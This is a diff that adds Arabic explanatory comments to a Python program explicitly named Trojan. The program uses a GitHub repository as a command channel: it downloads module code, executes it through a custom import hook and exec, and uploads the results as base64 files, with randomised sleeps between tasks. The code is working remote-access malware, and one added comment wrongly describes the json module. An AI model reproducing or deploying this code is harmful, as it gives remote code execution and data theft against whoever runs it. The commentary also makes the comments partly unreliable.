@@ -1,11 +1,11 @@
-import base64
-import github3
-import json
+import base64 #  base64 تُستخدم لتشفير وفك تشفير البيانات باستخدام ترميز 
+import github3  # GitHub (API) الخاصة بـ مكتبة تتيح لك التفاعل مع واجهة برمجة التطبيقات 
+import json   #  تُستخدم للوصول إلى معلومات النظام، مثل استيراد الوحدات، والتعامل مع استثناءات، وإدارة مسارات البحث عن الوحدات
 import sys
-import importlib
+import importlib # تُستخدم لاستيراد الوحدات ديناميكيًا في بايثون
 import time
 import random
-import threading
+import threading # تُستخدم لإنشاء وإدارة الخيوط
 from datetime import datetime
 
 def github_connect():
@@ -38,7 +38,7 @@ class GitImporter:
     def load_module(self, name):
         spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
         new_module = importlib.util.module_from_spec(spec)
-        exec(self.current_module_code, new_module.__dict__)
+        exec(self.current_module_code, new_module.__dict__)  #  تُستخدم لتنفيذ كود بايثون من نص
         sys.modules[spec.name] = new_module
         return new_module
 
@@ -48,25 +48,27 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
+        #################################
 
     def get_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
-        config = json.loads(base64.b64decode(config_json))
+        config_json = get_file_contents('config', self.config_file, self.repo) # استرداد محتوى ملف الإعدادات
+        config = json.loads(base64.b64decode(config_json)) # فك ترميز البيانات
         
         for task in config:
             if task['module'] not in sys.modules:
                 importlib.import_module(task['module'])
-        return config
+        return config # تُرجع الكائن config بعد فك ترميزه
 
     def module_runner(self, module):
-        result = sys.modules[module].run()
-        self.store_module_result(result)
+        result = sys.modules[module].run() # يقوم بالوصول إلى الوحدة المسماة module في قاموس sys.modules، والذي يحتوي على جميع الوحدات التي تم استيرادها في البرنامج
+        self.store_module_result(result) # 
 
     def store_module_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = bytes('%r' % data, 'utf-8')
-        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+        message = datetime.now().isoformat()  # يقوم بالحصول على الوقت الحالي وتنسيقه كسلسلة نصية باستخدام تنسيق ISO 8601
+        remote_path = f'data/{self.id}/{message}.data' # تحديد مسار التخزين
+
+        bindata = bytes('%r' % data, 'utf-8') # تحويل البيانات إلى بايتات
+        self.repo.create_file(remote_path, message, base64.b64encode(bindata)) #  تستدعي دالة لإنشاء ملف في مستودع github
 
     def run(self):
         while True:
@@ -77,10 +79,10 @@ class Trojan:
                     args=(task['module'],)  # Pass as a tuple
                 )
                 thread.start()
-                time.sleep(random.randint(1, 10))
-            time.sleep(random.randint(30*60, 30*60*60))
+                time.sleep(random.randint(1, 10))  # فترة الانتظار العشوائية
+            time.sleep(random.randint(30*60, 30*60*60))  # فترة الانتظار بعد تنفيذ جميع المهام
 
 if __name__ == '__main__':
-    sys.meta_path.append(GitImporter())
-    trojan = Trojan('abc')
+    sys.meta_path.append(GitImporter())  #  قائمة من الكائنات التي تُستخدم للبحث عن الوحدات عند استيرادها. يمكن إضافة كائنات جديدة لهذه القائمة، مما يتيح لها التحكم في كيفية استيراد الوحدات
+    trojan = Trojan('abc')  #   abc و يعطيه معرف Trojan يُنشئ كائنًا جديدًا من فئة  
     trojan.run()                    
